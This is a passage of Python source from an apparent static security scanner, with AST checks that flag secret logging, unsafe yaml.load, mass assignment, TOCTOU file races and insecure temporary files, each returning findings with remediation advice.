                                "is being passed to a logging function. Logging passwords, tokens, "
                                "or secrets can expose them in log files, monitoring systems, "
                                "or log aggregation platforms (Splunk, ELK, CloudWatch)."
                            ),
                            fix=(
                                "Never log sensitive values. If you need to log auth events:\n"
                                "  - Log user IDs, not passwords or tokens\n"
                                "  - Use structured logging with redaction masks\n"
                                f"  logger.info('Auth attempt for user_id=%s', uid)  # not {node.id}"
                            ),
                            language="python",
                        )

        return None

    # ── Insecure yaml.load [A08] ──────────────────────────────────────────────
    def _check_yaml_load(
        self,
        file_path: Path,
        call: ast.Call,
        tracker: PythonTaintTracker,
        lines: list[str],
    ) -> Finding | None:
        chain = _attr_chain(call.func)
        line_no = call.lineno

        # yaml.load(stream) without Loader keyword — defaults to full Loader (dangerous)
        if len(chain) == 2 and chain[0] == "yaml" and chain[1] in self.yaml_loads:
            # Check if Loader kwarg is present and safe
            loader_kw = next(
                (kw for kw in call.keywords if kw.arg == "Loader"), None
            )
            if loader_kw is None:
                if "DSER004" not in self.yaml_rules: return None
                rule = self.yaml_rules["DSER004"]
                return Finding(
                    rule_id=rule.id,
                    rule_name=rule.name,
                    severity=rule.severity,
                    file_path=str(file_path),
                    line_number=line_no,
                    snippet=self.get_snippet(lines, line_no),
                    description=rule.description,
                    fix=rule.fix,
                    language="python",
                )

        return None

    # ── Mass Assignment [A04] ─────────────────────────────────────────────────
    def _check_mass_assignment(
        self,
        file_path: Path,
        call: ast.Call,
        tracker: PythonTaintTracker,
        lines: list[str],
    ) -> Finding | None:
        chain = _attr_chain(call.func)
        line_no = call.lineno

        # Check for obj.__dict__.update(user_data)
        if len(chain) >= 2 and chain[-2] == "__dict__" and chain[-1] in self.mass_methods:
            if call.args:
                arg0 = call.args[0]
                if tracker.is_arg_tainted(call) or self._arg_contains_tainted_name(arg0, tracker.tainted_names):
                    if "MASS001" not in self.yaml_rules: return None
                    rule = self.yaml_rules["MASS001"]
                    return Finding(
                        rule_id=rule.id,
                        rule_name=rule.name,
                        severity=rule.severity,
                        file_path=str(file_path),
                        line_number=line_no,
                        snippet=self.get_snippet(lines, line_no),
                        description=rule.description,
                        fix=rule.fix,
                        language="python",
                    )

        # Check for User(**user_data)
        for kw in call.keywords:
            if kw.arg is None:  # This means **kwargs
                if tracker.is_arg_tainted(call) or self._arg_contains_tainted_name(kw.value, tracker.tainted_names):
                    return Finding(
                        rule_id="MASS002",
                        rule_name="Mass Assignment via **kwargs",
                        severity="MEDIUM",
                        file_path=str(file_path),
                        line_number=line_no,
                        snippet=self.get_snippet(lines, line_no),
                        description=(
                            f"A function or constructor `{chain[0] if chain else 'func'}()` is called "
                            "with **kwargs containing user-controlled data. "
                            "In ORMs (like Django/SQLAlchemy), this can lead to Mass Assignment vulnerabilities "
                            "if sensitive model fields are updated."
                        ),
                        fix=(
                            "Validate and filter the input dictionary before passing it via **kwargs.\n"
                            "Use Django form validation or Pydantic models to ensure only expected fields "
                            "are processed."
                        ),
                        language="python",
                    )
        return None

    # ── TOCTOU Race Condition [A01] ───────────────────────────────────────────
    def _check_toctou(
        self,
        file_path: Path,
        if_node: ast.If,
        tracker: PythonTaintTracker,
        lines: list[str],
        checked_paths: dict[str, ast.Call],
    ) -> Finding | None:
        # Check if the condition is `os.path.exists(path)` or `os.path.isfile(path)`
        test_call = None
        is_negated = False
        if isinstance(if_node.test, ast.Call):
            test_call = if_node.test
        elif isinstance(if_node.test, ast.UnaryOp) and isinstance(if_node.test.op, ast.Not):
            if isinstance(if_node.test.operand, ast.Call):
                test_call = if_node.test.operand
                is_negated = True
        
        if test_call:
            chain = _attr_chain(test_call.func)
            if len(chain) >= 2 and chain[-2] == "path" and chain[-1] in self.toctou_checks:
                # Track this path for sequential checks in the same scope
                arg_str = ""
                if test_call.args:
                    arg_str = ast.dump(test_call.args[0])
                    checked_paths[arg_str] = test_call

                # Case 1: if exists(path): open(path) -- captured within this block
                if not is_negated:
                    for child in ast.walk(if_node):
                        if child is if_node.test: continue
                        if isinstance(child, ast.Call):
                            child_chain = _attr_chain(child.func)
                            if len(child_chain) == 1 and child_chain[0] == "open":
                                # Open the same path?
                                if child.args and ast.dump(child.args[0]) == arg_str:
                                    if "RACE001" not in self.yaml_rules: return None
                                    rule = self.yaml_rules["RACE001"]
                                    return Finding(
                                        rule_id=rule.id,
                                        rule_name=rule.name,
                                        severity=rule.severity,
                                        file_path=str(file_path),
                                        line_number=test_call.lineno,
                                        snippet=self.get_snippet(lines, test_call.lineno),
                                        description=rule.description,
                                        fix=rule.fix,
                                        language="python",
                                    )
        return None

    def _check_toctou_sequential(
        self,
        file_path: Path,
        call: ast.Call,
        checked_paths: dict[str, ast.Call],
        lines: list[str],
    ) -> Finding | None:
        """Checks for an open() call that follows a file check in the same scope (guard clause pattern)."""
        chain = _attr_chain(call.func)
        if len(chain) == 1 and chain[0] == "open" and call.args:
            arg_str = ast.dump(call.args[0])
            if arg_str in checked_paths:
                test_call = checked_paths[arg_str]
                if "RACE001" not in self.yaml_rules: return None
                rule = self.yaml_rules["RACE001"]
                return Finding(
                    rule_id=rule.id,
                    rule_name=rule.name,
                    severity=rule.severity,
                    file_path=str(file_path),
                    line_number=call.lineno,
                    snippet=self.get_snippet(lines, call.lineno),
                    description=f"Sequential TOCTOU: Path was checked at line {test_call.lineno} and then opened.\n{rule.description}",
                    fix=rule.fix,
                    language="python",
                )
        return None

    def _check_toctou_sequential(
        self,
        file_path: Path,
        call: ast.Call,
        checked_paths: dict[str, ast.Call],
        lines: list[str],
    ) -> Finding | None:
        chain = _attr_chain(call.func)
        if len(chain) == 1 and chain[0] == "open" and call.args:
            arg_str = ast.dump(call.args[0])
            if arg_str in checked_paths:
                test_call = checked_paths[arg_str]
                if "RACE001" not in self.yaml_rules: return None
                rule = self.yaml_rules["RACE001"]
                return Finding(
                    rule_id=rule.id,
                    rule_name=rule.name,
                    severity=rule.severity,
                    file_path=str(file_path),
                    line_number=call.lineno,
                    snippet=self.get_snippet(lines, call.lineno),
                    description=f"Sequential TOCTOU: Path was checked at line {test_call.lineno} and then opened.\n{rule.description}",
                    fix=rule.fix,
                    language="python",
                )
        return None


    # ── Insecure Temporary Files [A01] ───────────────────────────────────────
    def _check_temp_files(
        self,
        file_path: Path,
        call: ast.Call,
        tracker: PythonTaintTracker,
        lines: list[str],
    ) -> Finding | None:
        chain = _attr_chain(call.func)
        line_no = call.lineno

        if len(chain) == 2 and chain[0] == "tempfile" and chain[1] in self.temp_funcs:
            if "TEMP001" not in self.yaml_rules: return None
            rule = self.yaml_rules["TEMP001"]
            return Finding(
                rule_id=rule.id,
                rule_name=rule.name,
                severity=rule.severity,
                file_path=str(file_path),
                line_number=line_no,
                snippet=self.get_snippet(lines, line_no),
                description=rule.description,
                fix=rule.fix,
                language="python",
            )
        return None
